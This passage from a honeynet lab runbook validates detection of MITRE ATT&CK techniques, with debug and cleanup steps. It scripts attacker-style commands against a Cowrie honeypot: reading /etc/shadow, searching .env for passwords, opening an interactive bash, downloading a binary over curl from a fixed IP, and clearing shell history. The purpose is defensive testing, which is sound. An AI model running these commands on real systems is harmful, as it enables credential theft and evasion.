curl -i "http://${TARGET}:18085/downloads/agent-update.bin" || true                  # T1041, T1105, T1190, T1204.002 when latest route is Dionaea
printf "payload upload test\r\n" | nc -w 3 "$TARGET" 19999 || true                   # T1190, T1105 through generic TCP capture
```

Cowrie command surface:

```bash
ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -p 10222 root@"$TARGET" # Open an interactive Cowrie jumpbox session after the admin-jumpbox route exists.
```

Run these inside the Cowrie shell:

```bash
whoami # Current user discovery.

id # User/group discovery.

uname -a # System discovery.

ls -la /tmp # File/directory discovery.

ip addr # Network configuration discovery.

ifconfig # Alternative network configuration discovery command.

cat /etc/shadow # Credential-dumping style sensitive file access.

grep password .env # Credential-in-file search.

sudo -l # Privilege escalation check.

crontab -l # Scheduled task discovery.

bash -i # Interactive shell execution.

curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin # Tool download from malware sink/Dionaea route.

history -c # Indicator removal.

exit # End the Cowrie session.
```

Expected Cowrie techniques include `T1003`, `T1016`, `T1033`, `T1053`, `T1059`, `T1070`, `T1082`, `T1083`, `T1105`, `T1548`, and `T1552.001`.

Automated alternative for repeatable validation:

```bash
# Create a temporary askpass helper so the SSH smoke can run non-interactively.
ask="$(mktemp)"

# Feed a dummy password to Cowrie.
printf '#!/bin/sh\necho root\n' > "$ask"

chmod +x "$ask" # Make the askpass helper executable.

# Send a sequence of shell commands into Cowrie to exercise command mappings.
{
  sleep 1
  printf 'whoami\n'
  sleep 0.5
  printf 'id\n'
  sleep 0.5
  printf 'uname -a\n'
  sleep 0.5
  printf 'ls -la /tmp\n'
  sleep 0.5
  printf 'ifconfig\n'
  sleep 0.5
  printf 'cat /etc/shadow\n'
  sleep 0.5
  printf 'grep password .env\n'
  sleep 0.5
  printf 'sudo -l\n'
  sleep 0.5
  printf 'crontab -l\n'
  sleep 0.5
  printf 'bash -i\n'
  sleep 0.5
  printf 'curl http://146.169.44.23:18085/downloads/agent-update.bin -o /tmp/agent-update.bin\n'
  sleep 0.5
  printf 'history -c\n'
  sleep 0.5
  printf 'exit\n'
} | timeout 35s env DISPLAY=:0 SSH_ASKPASS="$ask" SSH_ASKPASS_REQUIRE=force setsid \
  ssh -tt \
    -o NumberOfPasswordPrompts=1 \
    -o PubkeyAuthentication=no \
    -o PreferredAuthentications=password \
    -o ConnectTimeout=5 \
    -o StrictHostKeyChecking=no \
    -o UserKnownHostsFile=/dev/null \
    -p 10222 root@"$TARGET" || true

rm -f "$ask" # Remove the temporary askpass helper.
```

Check the evidence-level result:

```bash
sleep 5 # Wait for all forwarders and adapters to flush events into the profiler.

REQUIRED='["T1003","T1005","T1016","T1018","T1021","T1021.004","T1033","T1039","T1041","T1046","T1053","T1057","T1059","T1069","T1070","T1074","T1078","T1082","T1083","T1087.003","T1105","T1110","T1133","T1190","T1204.002","T1213","T1518","T1548","T1552.001","T1567","T1567.002","T1572","T1608"]' # Expected technique set for the manual coverage smoke.

jq --argjson required "$REQUIRED" ' # Compare persisted evidence against the required technique set.
  (.records // {}) as $records |
  [
    (
      if ($records | type) == "object" then
        [$records[] | .[]?]
      elif ($records | type) == "array" then
        $records
      else
        []
      end
    )[]
    | .tech_id?
    | select(. != null)
  ] | unique as $seen |
  {seen: $seen, missing: ($required - $seen)}
' data/runtime/evidence.json

# Also inspect the recent-profile view exposed by the dashboard API.
curl -s "${DASHBOARD}/api/summary" |
  jq --argjson required "$REQUIRED" '
    [ .attackers[].recent_techniques[]? ] | unique as $seen |
    {recent_profile_techniques: $seen}
  '
```

Expected: `missing` is empty. If `T1041` or `T1204.002` is missing, first confirm the latest `18085` route points to `dionaea-capture`; if it still points to the static `malware-sink`, rerun the high-interaction unlock in section 6.

## 8. Debug

```bash
# Control-plane service status.
docker-compose -p honeynet -f docker-compose.control.yml ps

# Enterprise/runtime service status.
docker-compose -p honeynet -f docker-compose.enterprise.yml ps

# Public portal forwarder logs.
docker logs --tail 50 honeynet_public-portal-forwarder_1

# Internal HTTP forwarder logs.
docker logs --tail 50 honeynet_internal-http-forwarder_1

# Internal protocol forwarder logs.
docker logs --tail 50 honeynet_internal-protocol-forwarder_1

# OpenCanary forwarder logs.
docker logs --tail 50 honeynet_opencanary-forwarder_1

# High-interaction forwarder logs.
docker logs --tail 50 honeynet_high-interaction-forwarder_1

tail -n 20 deploy/public-portal/logs/access.log # Raw public portal access log.

tail -n 20 data/runtime/internal_http_events.jsonl # Gateway-captured internal HTTP events.

tail -n 20 data/runtime/internal_protocol_events.jsonl # Gateway-captured protocol events.

tail -n 20 data/runtime/high_interaction_events.jsonl # Gateway/forwarder high-interaction events.

cat data/runtime/asset_gateway_routes.json | jq # Current source-IP route table consumed by asset-gateway.
```

## 9. Cleanup

```bash
./scripts/reset_enterprise_runtime.sh # Stop runtime containers and clear generated state.
```
